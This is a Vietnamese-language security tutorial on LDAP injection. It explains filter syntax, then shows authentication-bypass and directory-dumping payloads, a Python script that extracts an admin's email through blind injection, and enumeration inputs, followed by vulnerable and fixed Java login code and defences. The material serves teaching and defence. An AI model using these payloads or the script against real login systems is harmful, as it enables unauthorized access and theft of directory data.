# LDAP Injection

> **OWASP Top 10:2025**: A05 – Injection | **CWE**: CWE-90 | **Nguồn**: OWASP WSTG, HackTricks

## 🧱 Kiến thức Nền tảng

LDAP (Lightweight Directory Access Protocol) là giao thức tiêu chuẩn để truy cập và quản lý **directory services** — cơ sở dữ liệu dạng cây lưu trữ thông tin về users, groups, computers trong tổ chức. Các LDAP server phổ biến: **Active Directory** (Microsoft), **OpenLDAP**, **389 Directory Server**.

LDAP được sử dụng rộng rãi trong môi trường doanh nghiệp cho: xác thực tập trung (SSO), quản lý nhân viên, phân quyền truy cập, email directory. Hầu hết các ứng dụng enterprise đều tích hợp LDAP authentication.

LDAP sử dụng **search filters** với cú pháp đặc biệt dựa trên RFC 4515:

```
# LDAP Filter Syntax - Basic operations
(attribute=value)           # Equality match
(attribute=val*)            # Substring/wildcard match
(&(filter1)(filter2))       # AND - both must match
(|(filter1)(filter2))       # OR - either can match
(!(filter))                 # NOT - negation
(attribute>=value)          # Greater or equal
(attribute<=value)          # Less or equal
(attribute=*)               # Presence - attribute exists
```

```java
// Normal LDAP authentication in Java
import javax.naming.directory.*;

public boolean authenticate(String username, String password) {
    // Build LDAP search filter to find the user
    String filter = "(&(uid=" + username + ")(objectClass=person))";

    // Search in the directory
    SearchControls controls = new SearchControls();
    controls.setSearchScope(SearchControls.SUBTREE_SCOPE);

    NamingEnumeration<?> results = ctx.search(
        "dc=company,dc=com",  // Base DN (Distinguished Name)
        filter,                // Search filter
        controls
    );

    if (results.hasMore()) {
        // Attempt to bind (authenticate) with the found DN and password
        String userDN = results.next().getNameInNamespace();
        return ldapBind(userDN, password);  // Verify password via LDAP bind
    }
    return false;
}
```

Directory Information Tree (DIT) có cấu trúc phân cấp: `dc=company,dc=com` → `ou=People` → `cn=John Doe`. Mỗi entry có các attributes như `uid`, `cn`, `mail`, `userPassword`, `memberOf`.

## 🔍 Mô tả lỗ hổng

LDAP Injection xảy ra khi ứng dụng xây dựng LDAP filter bằng cách **nối chuỗi trực tiếp** với user input mà không escape các ký tự đặc biệt. Attacker có thể chèn các LDAP meta-characters (`*`, `(`, `)`, `|`, `&`, `!`, `\`) để thay đổi logic của filter.

Các ký tự đặc biệt trong LDAP filter:
- `*` — wildcard, match mọi giá trị
- `(` và `)` — phân tách filter expressions
- `|` — OR operator
- `&` — AND operator
- `!` — NOT operator
- `\` — escape character

## ⚔️ Cơ chế tấn công

### 1. Authentication Bypass

```
# Original filter built by application:
(&(uid=USERNAME)(userPassword=PASSWORD))

# Attack: inject wildcard into username field
Username: *
Password: *

# Resulting filter:
(&(uid=*)(userPassword=*))
# Matches ANY user with ANY password → returns first user (usually admin)
```

```
# Attack: Close the filter early and add always-true condition
Username: admin)(|(uid=*
Password: anything

# Resulting filter:
(&(uid=admin)(|(uid=*)(userPassword=anything)))
# The OR condition (uid=*) is always true → bypasses password check
```

### 2. Data Extraction via Blind LDAP Injection

```python
# Extract attribute values character by character using wildcards
import requests
import string

url = "http://target.com/login"
charset = string.ascii_lowercase + string.digits + "@._-"

# Extract admin's email attribute
extracted = ""
while True:
    found = False
    for c in charset:
        # Inject into username field to probe mail attribute
        payload = f"admin)(mail={extracted}{c}*"
        r = requests.post(url, data={
            "username": payload,
            "password": "anything)(|(uid=*"
        })
        if "Welcome" in r.text:  # Successful login indicates match
            extracted += c
            print(f"Found: {extracted}")
            found = True
            break
    if not found:
        break

print(f"Admin email: {extracted}")
```

### 3. Directory Enumeration

```
# Enumerate valid usernames using wildcard injection
Username: a*        → 200 OK (users starting with 'a' exist)
Username: admin*    → 200 OK (username starting with 'admin' exists)
Username: admini*   → 401 Fail
Username: admins*   → 401 Fail
# Confirmed username: admin

# Enumerate group membership
Username: *)(memberOf=cn=Domain Admins,ou=Groups,dc=company,dc=com
# Filter: (&(uid=*)(memberOf=cn=Domain Admins,...)(userPassword=...))
# Returns users who are Domain Admins
```

### 4. OR-based Injection to Dump Users

```
# Inject OR condition to return multiple entries
Username: *)(|(objectClass=*
Password: anything

# Resulting filter:
(&(uid=*)(|(objectClass=*)(userPassword=anything)))
# Returns ALL entries in the directory tree
```

## 🛡️ Biện pháp phòng thủ

1. **Escape LDAP special characters**: Thay thế `*`, `(`, `)`, `\`, `NUL` bằng escaped form (`\2a`, `\28`, `\29`, `\5c`, `\00`).
2. **Dùng parameterized LDAP queries**: Sử dụng framework LDAP API với bind parameters.
3. **Input validation**: Chỉ cho phép alphanumeric characters cho username/password fields.
4. **Bind authentication**: Xác thực bằng LDAP bind thay vì so sánh password trong filter.
5. **Least privilege**: LDAP service account chỉ có quyền đọc các attributes cần thiết.
6. **Rate limiting và account lockout**: Ngăn chặn enumeration attacks.

## 💻 Code Example

```java
// ❌ VULNERABLE: String concatenation in LDAP filter
public boolean login(String username, String password) {
    // User input directly concatenated into filter - LDAP injection!
    String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";

    NamingEnumeration<?> results = ctx.search(
        "ou=People,dc=company,dc=com", filter, controls
    );
    return results.hasMore();
}
```

```java
// ✅ SECURE: Escaped input + bind authentication
public boolean login(String username, String password) {
    // Step 1: Sanitize input - escape LDAP special characters
    String safeUsername = escapeLdapFilter(username);

    // Step 2: Validate format - only alphanumeric and limited chars
    if (!safeUsername.matches("[a-zA-Z0-9._-]{1,64}")) {
        return false;
    }

    // Step 3: Search for user DN only (no password in filter)
    String filter = "(uid=" + safeUsername + ")";
    NamingEnumeration<?> results = ctx.search(
        "ou=People,dc=company,dc=com", filter, controls
    );

    if (!results.hasMore()) return false;

    // Step 4: Authenticate via LDAP bind (server validates password)
    String userDN = results.next().getNameInNamespace();
    try {
        Hashtable<String, String> bindEnv = new Hashtable<>();
        bindEnv.put(Context.SECURITY_PRINCIPAL, userDN);
        bindEnv.put(Context.SECURITY_CREDENTIALS, password);
        new InitialDirContext(bindEnv);  // Bind succeeds = valid password
        return true;
    } catch (AuthenticationException e) {
        return false;  // Invalid password
    }
}

// LDAP special character escaping per RFC 4515
public static String escapeLdapFilter(String input) {
    StringBuilder sb = new StringBuilder();
    for (char c : input.toCharArray()) {
        switch (c) {
            case '\\': sb.append("\\5c"); break;
            case '*':  sb.append("\\2a"); break;
            case '(':  sb.append("\\28"); break;
            case ')':  sb.append("\\29"); break;
            case '\0': sb.append("\\00"); break;
            default:   sb.append(c);
        }
    }
    return sb.toString();
}
```

## 📚 Nguồn tham khảo
- OWASP WSTG – LDAP Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection
- HackTricks – LDAP Injection: https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html
- CWE-90: https://cwe.mitre.org/data/definitions/90.html
- RFC 4515 – LDAP Search Filters: https://datatracker.ietf.org/doc/html/rfc4515
